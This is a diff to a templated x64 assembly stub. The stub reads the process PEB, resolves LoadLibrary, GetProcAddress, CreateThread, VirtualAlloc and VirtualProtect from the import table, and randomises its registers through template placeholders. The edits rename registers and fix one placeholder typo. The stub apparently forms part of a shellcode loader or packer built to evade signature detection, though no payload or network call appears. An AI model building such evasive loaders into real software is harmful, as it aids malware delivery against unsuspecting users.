@@ -1,7 +1,7 @@
 .code64
 
-// r10 store address of ImageBaseAddress
-// r11 store address of kernel32.dll
+// rdi store address of ImageBaseAddress
+// rsi store address of kernel32.dll
 // r12 store address of GetProcAddress
 // r13 store address of CreateThread
 // r14 store address of VirtualAlloc
@@ -36,21 +36,21 @@ entry:
   mov {{.Reg.rax}}, 0x60
   mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
   // store image base address
-  mov {{.RegS.r10}}, [{{.Reg.rbx}} + 0x10]
+  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]
 
   // read the LoadLibraryA/W form IAT
-  mov {{.RegS.rbx}}, {{.RegS.r10}}
-  add {{.RegS.rbx}}, {{hex .LoadLibrary}}
-  mov {{.RegS.rbx}}, [{{.RegS.rbx}}]
+  mov {{.RegN.rbx}}, {{.RegN.rdi}}
+  add {{.RegN.rbx}}, {{hex .LoadLibrary}}
+  mov {{.RegN.rbx}}, [{{.RegN.rbx}}]
 
   // load kernel32.dll
   mov rcx, rsp
   sub rsp, 0x20
-  call {{.RegS.rbx}}
+  call {{.RegN.rbx}}
   add rsp, 0x20
 
   // store the handle of kernel32.dll
-  mov {{.RegS.r11}}, rax
+  mov {{.RegN.rsi}}, rax
 
   // restore stack for kernel32 module name
   {{if .LoadLibraryWOnly}}
@@ -60,9 +60,9 @@ entry:
   {{end}}
 
   // read the GetProcAddress form IAT
-  mov {{.RegV.rax}}, {{.RegS.r10}}
+  mov {{.RegV.rax}}, {{.RegN.rdi}}
   add {{.RegV.rax}}, {{hex .GetProcAddress}}
-  mov {{.RegS.r12}}, [{{.RegV.rax}}]
+  mov {{.RegN.r12}}, [{{.RegV.rax}}]
 
   // get procedure address of CreateThread
   {{if .LackCreateThread}}
@@ -76,18 +76,18 @@ entry:
     xor {{.RegV.rcx}}, {{.RegV.r9}}
     push {{.RegV.rcx}}
     // call GetProcAddress
-    mov rcx, {{.RegS.r11}}
+    mov rcx, {{.RegN.rsi}}
     mov rdx, rsp
     sub rsp, 0x20
-    call {{.RegS.r12}}
+    call {{.RegN.r12}}
     add rsp, 0x20
-    mov {{.RegS.r13}}, rax
+    mov {{.RegN.r13}}, rax
     // restore stack for procedure name
     add rsp, 2*8
   {{else}}
-    mov {{.RegV.rcx}}, {{.RegS.r10}}
+    mov {{.RegV.rcx}}, {{.RegN.rdi}}
     add {{.RegV.rcx}}, {{hex .CreateThread}}
-    mov {{.RegS.r13}}, [{{.RegV.rcx}}]
+    mov {{.RegN.r13}}, [{{.RegV.rcx}}]
   {{end}}
 
   // get procedure address of VirtualAlloc
@@ -102,18 +102,18 @@ entry:
     xor {{.RegV.rcx}}, {{.RegV.r9}}
     push {{.RegV.rcx}}
     // call GetProcAddress
-    mov rcx, {{.RegS.r11}}
+    mov rcx, {{.RegN.rsi}}
     mov rdx, rsp
     sub rsp, 0x20
-    call {{.RegS.r12}}
+    call {{.RegN.r12}}
     add rsp, 0x20
-    mov {{.RegS.r14}}, rax
+    mov {{.RegN.r14}}, rax
     // restore stack for procedure name
     add rsp, 2*8
   {{else}}
-    mov {{.RegV.rdx}}, {{.RegS.r10}}
+    mov {{.RegV.rdx}}, {{.RegN.rdi}}
     add {{.RegV.rdx}}, {{hex .VirtualAlloc}}
-    mov {{.RegS.r14}}, [{{.RegV.rdx}}]
+    mov {{.RegN.r14}}, [{{.RegV.rdx}}]
   {{end}}
 
   // get procedure address of VirtualProtect
@@ -128,18 +128,18 @@ entry:
     xor {{.RegV.rcx}}, {{.RegV.r9}}
     push {{.RegV.rcx}}
     // call GetProcAddress
-    mov rcx, {{.RegS.r11}}
+    mov rcx, {{.RegN.rsi}}
     mov rdx, rsp
     sub rsp, 0x20
-    call {{.RegS.r12}}
+    call {{.RegN.r12}}
     add rsp, 0x20
-    mov {{.RegS.r15}}, rax
+    mov {{.RegN.r15}}, rax
     // restore stack for procedure name
     add rsp, 2*8
   {{else}}
-    mov {{.RegV.r8}}, {{.RegS.r10}}
+    mov {{.RegV.r8}}, {{.RegN.rdi}}
     add {{.RegV.r8}}, {{hex .VirtualProtect}}
-    mov {{.RegS.r15}}, [{{.RegV.r8}}]
+    mov {{.RegN.r15}}, [{{.RegV.r8}}]
   {{end}}
 
 {{else}}
@@ -148,20 +148,20 @@ entry:
   mov {{.Reg.rax}}, 0x60
   mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
   // store image base address
-  mov {{.RegS.r10}}, [{{.Reg.rbx}} + 0x10]
+  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]
 
   // get procedure address of CreateThread
-  mov {{.RegV.rcx}}, {{.RegS.r10}}
+  mov {{.RegV.rcx}}, {{.RegN.rdi}}
   add {{.RegV.rcx}}, {{hex .CreateThread}}
-  mov {{.RegS.r13}}, [{{.RegV.rcx}}]
+  mov {{.RegN.r13}}, [{{.RegV.rcx}}]
   // get procedure address of VirtualAlloc
-  mov {{.ReV.rdx}}, {{.RegS.r10}}
-  add {{.ReV.rdx}}, {{hex .VirtualAlloc}}
-  mov {{.RegS.r14}}, [{{.RegV.rdx}}]
+  mov {{.RegV.rdx}}, {{.RegN.rdi}}
+  add {{.RegV.rdx}}, {{hex .VirtualAlloc}}
+  mov {{.RegN.r14}}, [{{.RegV.rdx}}]
   // get procedure address of VirtualProtect
-  mov {{.RegV.r8}}, {{.RegS.r10}}
+  mov {{.RegV.r8}}, {{.RegN.rdi}}
   add {{.RegV.r8}}, {{hex .VirtualProtect}}
-  mov {{.RegS.r15}}, [{{.RegV.r8}}]
+  mov {{.RegN.r15}}, [{{.RegV.r8}}]
 {{end}}
 
   int3
